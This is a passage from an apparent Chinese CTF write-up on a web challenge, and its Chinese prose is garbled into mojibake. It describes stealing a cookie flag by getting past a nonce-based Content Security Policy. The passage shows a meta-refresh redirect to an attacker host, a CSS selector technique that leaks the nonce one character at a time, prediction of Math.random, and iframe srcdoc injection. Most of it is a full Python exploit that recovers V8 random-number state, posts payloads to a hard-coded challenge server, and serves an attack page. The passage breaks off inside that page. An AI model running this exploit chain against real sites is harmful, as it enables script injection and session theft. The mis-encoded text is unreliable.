è½½ï¼Œéœ€è¦nonceæ¥æ‰§è¡Œè„šæœ¬ï¼š<br><code>&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &#39;nonce-&lt;%= nonce %&gt;&#39;; frame-src &#39;none&#39;; object-src &#39;none&#39;; style-src &#39;unsafe-inline&#39; https://unpkg.com&quot;&gt;</code><br>ç›®æ ‡æ˜¯å·cookieé‡Œçš„flag.<br>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨metaæ ‡ç­¾è¿›è¡Œè·³è½¬ï¼š<br><code>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1; http://attacker.com&quot;&gt;</code><br>é‚£ä¹ˆæˆ‘ä»¬æ¥ä¸‹æ¥è¦åšçš„å°±æ˜¯ä¸¤æ­¥ï¼šè·å–nonceâ€”&gt;æ‰§è¡Œjs  </p>\n<h3 id=\"è·å–nonce\"><a href=\"#è·å–nonce\" class=\"headerlink\" title=\"è·å–nonce\"></a>è·å–nonce</h3><p>æ­£è§£åº”è¯¥æ˜¯é€šè¿‡æ³¨å…¥CSSï¼Œç”¨CSSåŒ¹é…å™¨åŒ¹é…nonceå±æ€§ï¼Œé€æ­¥è·å–nonceã€‚<br>å¯èƒ½æœ‰äººä¼šå¥½å¥‡ï¼Œæ¯æ¬¡é¡µé¢åˆ·æ–°ä¸æ˜¯ä¼šé‡æ–°ç”Ÿæˆnonceå—ï¼Ÿä½†æ­¤é¢˜æœ‰ä¸€ä¸ªç‰¹æ®Šä¹‹å¤„ï¼šä¼ å‚æ–¹æ³•æ˜¯é€šè¿‡URLçš„<code>#</code>é”šï¼ˆå“ˆå¸Œ&#x2F;frame&#x2F;â€¦ï¼‰æ¥ä¼ å‚ï¼Œå¹¶é€šè¿‡é¡µå†…jsåŠ¨æ€æ¸²æŸ“ã€‚å› æ­¤å½“å‰è¿›åé€€æ—¶å¹¶ä¸ä¼šåˆ·æ–°ï¼Œ<strong>è€Œæ˜¯è°ƒç”¨æµè§ˆå™¨ç¼“å­˜ã€‚å› æ­¤nonceä¸ä¼šæ”¹å˜</strong>ã€‚<br>å½“æ—¶ä»¥ä¸ºæœ‰<a href=\"https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/nonce#description\">nonce hiding</a>è¿™ç§ä¸œè¥¿ï¼Œæ‰€ä»¥æ²¡æœ‰å¾€ä¸‹å°è¯•ï¼Œç»“æœèµ›åå‘ç°è¿™ä¼¼ä¹æ˜¯ä¸ªé¥¼å¹¶æœªå®ç°â€¦â€¦å½“ç„¶ï¼Œæˆ‘ä»¬çš„åšæ³•æ˜¯ç›´æ¥åœ¨æ–°æ ‡ç­¾é¡µfetchå¹¶æ‹¿åˆ°é¡µé¢å†…å®¹æ­£åˆ™åŒ¹é…ï¼Œæ ¹æœ¬å°±ä¸ç»è¿‡æµè§ˆå™¨è¿‡æ»¤ã€‚<br>å®˜æ–¹çš„åšæ³•å°±æ˜¯ä½¿ç”¨CSSæ³¨å…¥æ¯æ¬¡å·ä¸€ä½ï¼Œå…·ä½“åšæ³•è§<a href=\"http://sirdarckcat.blogspot.com/2016/12/how-to-bypass-csp-nonces-with-dom-xss.html\">how-to-bypass-csp-nonces-with-dom-xss</a><br>æ ¸å¿ƒéƒ¨åˆ†ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">The summary of this attack is that it&#x27;s possible to create a CSS program that exfiltrates the values of HTML attributes character-by-character, simply by generating HTTP requests every time a CSS selector matches, and repeating consecutively. If you haven&#x27;t seen this working, take a look here. The way it works is very simple, it just creates a CSS attribute selector of the form:</span><br><span class=\"line\"></span><br><span class=\"line\">*[attribute^=&quot;a&quot;]&#123;background:url(&quot;record?match=a&quot;)&#125;</span><br><span class=\"line\">*[attribute^=&quot;b&quot;]&#123;background:url(&quot;record?match=b&quot;)&#125;</span><br><span class=\"line\">*[attribute^=&quot;c&quot;]&#123;background:url(&quot;record?match=c&quot;)&#125;</span><br><span class=\"line\">[...]</span><br><span class=\"line\"></span><br><span class=\"line\">And then, once we get a match, repeat with:</span><br><span class=\"line\">*[attribute^=&quot;aa&quot;]&#123;background:url(&quot;record?match=aa&quot;)&#125;</span><br><span class=\"line\">*[attribute^=&quot;ab&quot;]&#123;background:url(&quot;record?match=ab&quot;)&#125;</span><br><span class=\"line\">*[attribute^=&quot;ac&quot;]&#123;background:url(&quot;record?match=ac&quot;)&#125;</span><br><span class=\"line\">[...]</span><br><span class=\"line\"></span><br><span class=\"line\">Until it exfiltrates the complete attribute.</span><br></pre></td></tr></table></figure>\n<p>ç„¶è€Œæˆ‘ä»¬å‘ç°ä»–åªä½¿ç”¨äº†<code>Math.random</code>æ¥ç”Ÿæˆéšæœºnonceï¼Œè¿™å®Œå…¨æ˜¯å¯ä»¥é¢„æµ‹çš„ï¼š<a href=\"https://github.com/PwnFunction/v8-randomness-predictor\">https://github.com/PwnFunction/v8-randomness-predictor</a><br><strong>äºæ˜¯æˆ‘ä»¬æ–°å¼€ä¸€ä¸ªæ ‡ç­¾é¡µç„¶åå¤šæ¬¡fetché˜…è¯»æ–‡ç« é¡µé¢æ‹¿ä¸€å †nonceç»™é¢„æµ‹å™¨ï¼Œç›´æ¥å°±èƒ½çŸ¥é“ä¸‹ä¸€ä¸ªnonce.</strong>  </p>\n<h3 id=\"æ‰§è¡ŒJS\"><a href=\"#æ‰§è¡ŒJS\" class=\"headerlink\" title=\"æ‰§è¡ŒJS\"></a>æ‰§è¡ŒJS</h3><p>nonceå·²çŸ¥ä¹‹åå¯ä»¥ç›´æ¥åœ¨è‡ªå·±VPSä¸Šå‘é€è¯·æ±‚åˆ›å»ºç¬”è®°ã€‚<br>æ¥ä¸‹æ¥è¦è®©å—å®³è€…åŠ è½½é¡µé¢æ‰è¡Œã€‚è¿™ä¸ªåªéœ€è¦çœ‹<code>share_read.js</code>å°±ä¼šå‘ç°è§¦å‘<code>hashchange</code>äº‹ä»¶å³å¯ã€‚ç”±äºç¼“å­˜ï¼ˆå‰è¿›åé€€ç¼“å­˜ï¼Œbfcacheï¼‰çš„å­˜åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å·²çŸ¥nonceçš„æ ‡ç­¾é¡µéšä¾¿å¼€ä¸ªé¡µé¢ç„¶å<code>extra.history.go(-1);</code>ï¼Œå¹¶ä¿®æ”¹hashå€¼ä¾¿èƒ½å†æ¬¡è§¦å‘poståŠ è½½ï¼Œè®©å·²ç»è¢«å›è°ƒå‡½æ•°åˆ æ‰çš„äº‹ä»¶ç›‘å¬å™¨åœ¨é‡æ–°è¿è¡Œçš„jsä¸­ç„•å‘ç¬¬äºŒæ˜¥ã€‚<br>è¿™æ—¶æˆ‘ä»¬å‘ç°å•çº¯æ’å…¥scriptæ ‡ç­¾å¹¶ä¸èƒ½è¢«æ‰§è¡Œï¼Œå› ä¸ºjsè„šæœ¬æ˜¯å¾€é¡µé¢DOMèŠ‚ç‚¹å†™å…¥<code>innerText</code>è€Œå·²ã€‚<br>ç»è¿‡ä¸€ç•ªç¥ç§˜çš„æ‘¸ç´¢ï¼Œå¤§æˆ˜MDNçš„manualï¼Œæˆ‘ä»¬å‘ç°äº†ä¸€ä¸ªç¥å¥‡çš„å±æ€§ï¼š<code>&lt;iframe srcdoc=&quot;...&quot;&gt;</code><br>åœ¨<a href=\"https://csplite.com/csp/test188/\">CSPæµ‹è¯•ç½‘ç«™</a>ä¸­æ˜¯è¿™ä¹ˆè¯´çš„ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Content Security Policy: the srcdoc attribute in the iframe tag is not governed by frame-src, but its content is blocked by other directives of the parent page</span><br></pre></td></tr></table></figure>\n\n<p>ä¹Ÿå°±æ˜¯æ’å…¥æ—¶å°±ä¼šæ‰§è¡Œã€‚è‡³æ­¤ï¼Œæˆ‘ä»¬å¾—ä»¥æ‰§è¡Œæ’å…¥çš„jsä»£ç ã€‚  </p>\n<h3 id=\"å¤‡æ³¨\"><a href=\"#å¤‡æ³¨\" class=\"headerlink\" title=\"å¤‡æ³¨\"></a>å¤‡æ³¨</h3><p>å®˜æ–¹ideaæ¥è‡ªè¿™ç¯‡æ–‡ç« ï¼Œä¹Ÿæ˜¯åœºä¸Šæ‰¾åˆ°è¿‡çš„ææ–™ï¼š<a href=\"https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/chrome-cache-to-xss\">Chrome Cache to XSS</a><br>å…¶ä»–ä¸€äº›å¾ˆæœ‰ç”¨çš„ææ–™ï¼š<a href=\"http://sebastian-lekies.de/csp/bypasses.php\">Collection of CSP bypasses</a><br>CSPç›¸å…³æµ‹è¯•çš„ç½‘ç«™ï¼š<a href=\"https://csplite.com/csp/\">https://csplite.com/csp/</a><br>éšæœºæ•°é¢„æµ‹è§£æ³•çš„å®Œæ•´æœåŠ¡ç«¯ä»£ç ï¼š</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/python3</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> struct, time</span><br><span class=\"line\"><span class=\"keyword\">from</span> hashlib <span class=\"keyword\">import</span> md5</span><br><span class=\"line\"><span class=\"keyword\">from</span> tqdm <span class=\"keyword\">import</span> trange</span><br><span class=\"line\"></span><br><span class=\"line\">alphabet =  <span class=\"string\">&#x27;abcdefghijklmnopqrstuvwxyz0123456789&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">generate_same_for</span>(<span class=\"params\">alphabet</span>):</span><br><span class=\"line\">    sames_for = []</span><br><span class=\"line\">    alphas = <span class=\"built_in\">len</span>(alphabet)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(alphas):</span><br><span class=\"line\">        start = i / alphas</span><br><span class=\"line\">        end = (i + <span class=\"number\">1</span>) / alphas</span><br><span class=\"line\">        float_begin = struct.pack(<span class=\"string\">&quot;d&quot;</span>, start + <span class=\"number\">1</span>)</span><br><span class=\"line\">        float_end = struct.pack(<span class=\"string\">&quot;d&quot;</span>, end + <span class=\"number\">1</span>)</span><br><span class=\"line\">        uint_begin = struct.unpack(<span class=\"string\">&quot;&lt;Q&quot;</span>, float_begin)[<span class=\"number\">0</span>] &amp; ((<span class=\"number\">1</span> &lt;&lt; <span class=\"number\">52</span>) - <span class=\"number\">1</span>)</span><br><span class=\"line\">        uint_end = (struct.unpack(<span class=\"string\">&quot;&lt;Q&quot;</span>, float_end)[<span class=\"number\">0</span>] - <span class=\"number\">1</span>) &amp; ((<span class=\"number\">1</span> &lt;&lt; <span class=\"number\">52</span>) - <span class=\"number\">1</span>)</span><br><span class=\"line\">        x, y = <span class=\"built_in\">bin</span>(uint_begin)[<span class=\"number\">2</span>:].zfill(<span class=\"number\">52</span>), <span class=\"built_in\">bin</span>(uint_end)[<span class=\"number\">2</span>:].zfill(<span class=\"number\">52</span>)</span><br><span class=\"line\">        sames = <span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> x[sames] == y[sames]:</span><br><span class=\"line\">            sames += <span class=\"number\">1</span></span><br><span class=\"line\">        sames_for.append((<span class=\"built_in\">int</span>(x[:sames], <span class=\"number\">2</span>) <span class=\"keyword\">if</span> sames <span class=\"keyword\">else</span> <span class=\"number\">0</span>, sames))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> sames_for</span><br><span class=\"line\"></span><br><span class=\"line\">sames_for = generate_same_for(alphabet)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">solve</span>(<span class=\"params\">question, alphabet, sames_for</span>):</span><br><span class=\"line\">    sequence = [alphabet.index(i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> question]</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">test_solution</span>(<span class=\"params\">prefix_count</span>):</span><br><span class=\"line\">        <span class=\"keyword\">def</span> <span class=\"title function_\">make_left_shift</span>(<span class=\"params\">state, n</span>):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> state[n:] + [<span class=\"number\">0</span>]*n</span><br><span class=\"line\">        <span class=\"keyword\">def</span> <span class=\"title function_\">make_right_shift</span>(<span class=\"params\">state, n</span>):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> [<span class=\"number\">0</span>]*n + state[:-n]</span><br><span class=\"line\">        <span class=\"keyword\">def</span> <span class=\"title function_\">make_xor</span>(<span class=\"params\">s1, s2</span>):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> [s1[i]^s2[i] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">64</span>)]</span><br><span class=\"line\">        As = []</span><br><span class=\"line\">        bs = []</span><br><span class=\"line\">        <span class=\"keyword\">def</span> <span class=\"title function_\">add_equs</span>(<span class=\"params\">ss, vals, cnt</span>):</span><br><span class=\"line\">            <span class=\"keyword\">nonlocal</span> As, bs</span><br><span class=\"line\">            <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(cnt):</span><br><span class=\"line\">                As.append(ss[i])</span><br><span class=\"line\">                bs.append((vals&gt;&gt;(cnt-<span class=\"number\">1</span>-i))&amp;<span class=\"number\">1</span>)</span><br><span class=\"line\">        matched = <span class=\"number\">0</span></span><br><span class=\"line\">        cur = <span class=\"number\">0</span></span><br><span class=\"line\">        se_state0 = [<span class=\"number\">1</span>&lt;&lt;i <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">64</span>)]</span><br><span class=\"line\">        se_state1 = [<span class=\"number\">1</span>&lt;&lt;i <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">64</span>, <span class=\"number\">128</span>)]</span><br><span class=\"line\">        <span class=\"keyword\">while</span> matched &lt; <span class=\"built_in\">len</span>(sequence):</span><br><span class=\"line\">            <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">64</span>):</span><br><span class=\"line\">                se_s1 = se_state0</span><br><span class=\"line\">                se_s0 = se_state1</span><br><span class=\"line\">                se_state0 = se_s0</span><br><span class=\"line\">                se_s1 = make_xor(se_s1, make_left_shift(se_s1, <span class=\"number\">23</span>))</span><br><span class=\"line\">                se_s1 = make_xor(se_s1, make_right_shift(se_s1, <span class=\"number\">17</span>))</span><br><span class=\"line\">                se_s1 = make_xor(se_s1, se_s0)</span><br><span class=\"line\">                se_s1 = make_xor(se_s1, make_right_shift(se_s0, <span class=\"number\">26</span>))</span><br><span class=\"line\">                se_state1 = se_s1</span><br><span class=\"line\">                correct_index = <span class=\"number\">64</span> - <span class=\"number\">1</span> - i + cur - prefix_count</span><br><span class=\"line\">                <span class=\"keyword\">if</span> correct_index &gt;= <span class=\"number\">0</span> <span class=\"keyword\">and</span> correct_index &lt; <span class=\"built_in\">len</span>(sequence):</span><br><span class=\"line\">                    uu = sames_for[sequence[correct_index]]</span><br><span class=\"line\">                    add_equs(se_state0, uu[<span class=\"number\">0</span>], uu[<span class=\"number\">1</span>])</span><br><span class=\"line\">                    matched += <span class=\"number\">1</span></span><br><span class=\"line\">            cur += <span class=\"number\">64</span></span><br><span class=\"line\">        BAs = [<span class=\"number\">0</span>]*<span class=\"number\">128</span></span><br><span class=\"line\">        Bbs = [<span class=\"number\">0</span>]*<span class=\"number\">128</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(As)):</span><br><span class=\"line\">            A, b = As[i], bs[i]</span><br><span class=\"line\">            listed = <span class=\"literal\">False</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">128</span>):</span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> ((A&gt;&gt;j)&amp;<span class=\"number\">1</span>):</span><br><span class=\"line\">                    <span class=\"keyword\">continue</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> BAs[j] == <span class=\"number\">0</span>:</span><br><span class=\"line\">                    BAs[j] = A</span><br><span class=\"line\">                    Bbs[j] = b</span><br><span class=\"line\">                    listed = <span class=\"literal\">True</span></span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    A ^= BAs[j]</span><br><span class=\"line\">                    b ^= Bbs[j]</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> listed <span class=\"keyword\">and</span> b:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">128</span>)[::-<span class=\"number\">1</span>]:</span><br><span class=\"line\">            <span class=\"keyword\">assert</span> BAs[i] != <span class=\"number\">0</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(i + <span class=\"number\">1</span>, <span class=\"number\">128</span>):</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (BAs[i]&gt;&gt;j)&amp;<span class=\"number\">1</span>:</span><br><span class=\"line\">                    Bbs[i] ^= Bbs[j]</span><br><span class=\"line\">        se_state0 = <span class=\"built_in\">int</span>(<span class=\"string\">&#x27;&#x27;</span>.join([<span class=\"built_in\">str</span>(i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> Bbs[:<span class=\"number\">64</span>]]), <span class=\"number\">2</span>)</span><br><span class=\"line\">        se_state1 = <span class=\"built_in\">int</span>(<span class=\"string\">&#x27;&#x27;</span>.join([<span class=\"built_in\">str</span>(i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> Bbs[<span class=\"number\">64</span>:]]), <span class=\"number\">2</span>)</span><br><span class=\"line\">        generated = <span class=\"number\">0</span></span><br><span class=\"line\">        full = []</span><br><span class=\"line\">        <span class=\"keyword\">while</span> generated &lt; <span class=\"built_in\">len</span>(sequence) + prefix_count + <span class=\"number\">128</span>:</span><br><span class=\"line\">            cached = []</span><br><span class=\"line\">            <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">64</span>):</span><br><span class=\"line\">                se_s1 = se_state0</span><br><span class=\"line\">                se_s0 = se_state1</span><br><span class=\"line\">                se_state0 = se_s0</span><br><span class=\"line\">                se_s1 ^= (se_s1 &lt;&lt; <span class=\"number\">23</span>) &amp; <span class=\"number\">0xffffffffffffffff</span></span><br><span class=\"line\">                se_s1 ^= se_s1 &gt;&gt; <span class=\"number\">17</span></span><br><span class=\"line\">                se_s1 ^= se_s0</span><br><span class=\"line\">                se_s1 ^= se_s0 &gt;&gt; <span class=\"number\">26</span></span><br><span class=\"line\">                se_state1 = se_s1</span><br><span class=\"line\">                cached.append(struct.unpack(<span class=\"string\">&quot;d&quot;</span>, struct.pack(<span class=\"string\">&quot;&lt;Q&quot;</span>, (se_state0 &gt;&gt; <span class=\"number\">12</span>) | <span class=\"number\">0x3FF0000000000000</span>))[<span class=\"number\">0</span>] - <span class=\"number\">1</span>)</span><br><span class=\"line\">            generated += <span class=\"number\">64</span></span><br><span class=\"line\">            full += cached[::-<span class=\"number\">1</span>]</span><br><span class=\"line\">        full = full[prefix_count:]</span><br><span class=\"line\">        full = <span class=\"string\">&#x27;&#x27;</span>.join([alphabet[<span class=\"built_in\">int</span>(v * <span class=\"built_in\">len</span>(alphabet))] <span class=\"keyword\">for</span> v <span class=\"keyword\">in</span> full])</span><br><span class=\"line\">        <span class=\"keyword\">assert</span> full[:<span class=\"built_in\">len</span>(sequence)] == question</span><br><span class=\"line\">        ans = full[<span class=\"built_in\">len</span>(sequence):][:<span class=\"number\">128</span>]</span><br><span class=\"line\">        <span class=\"keyword\">return</span> ans</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">64</span>):</span><br><span class=\"line\">        ret = test_solution(i)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ret:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> ret</span><br><span class=\"line\">    <span class=\"keyword\">raise</span> Exception(<span class=\"string\">&#x27;no solution&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">from</span> bs4 <span class=\"keyword\">import</span> BeautifulSoup</span><br><span class=\"line\"></span><br><span class=\"line\">sess = requests.Session()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">login</span>(<span class=\"params\">username, password</span>):</span><br><span class=\"line\">    <span class=\"keyword\">global</span> sess</span><br><span class=\"line\">    sess = requests.Session()</span><br><span class=\"line\">    url = <span class=\"string\">&#x27;http://3.37.109.189:8080/login&#x27;</span></span><br><span class=\"line\">    sess.post(url, data=&#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;username&#x27;</span>: username,</span><br><span class=\"line\">        <span class=\"string\">&#x27;password&#x27;</span>: password</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">write</span>(<span class=\"params\">title, content</span>):</span><br><span class=\"line\">    url = <span class=\"string\">&#x27;http://3.37.109.189:8080/write&#x27;</span></span><br><span class=\"line\">    r = sess.post(url, data=&#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;title&#x27;</span>: title,</span><br><span class=\"line\">        <span class=\"string\">&#x27;content&#x27;</span>: content</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">share</span>(<span class=\"params\"><span class=\"built_in\">id</span>=<span class=\"number\">0</span></span>):</span><br><span class=\"line\">    url = <span class=\"string\">&#x27;http://3.37.109.189:8080/share_diary/0&#x27;</span></span><br><span class=\"line\">    r = sess.get(url)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask, request</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">index</span>():</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">&lt;!DOCTYPE html&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;html&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;head&gt;&lt;/head&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;body&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;script&gt;</span></span><br><span class=\"line\"><span class=\"string\">            const genNonce = () =&gt; &quot;_&quot;.repeat(8).replace(/_/g,()=&gt;&quot;abcdefghijklmnopqrstuvwxyz0123456789&quot;.charAt(Math.random()*36));</span></span><br><span class=\"line\"><span class=\"string\">            async function cc() &#123;</span></span><br><span class=\"line\"><span 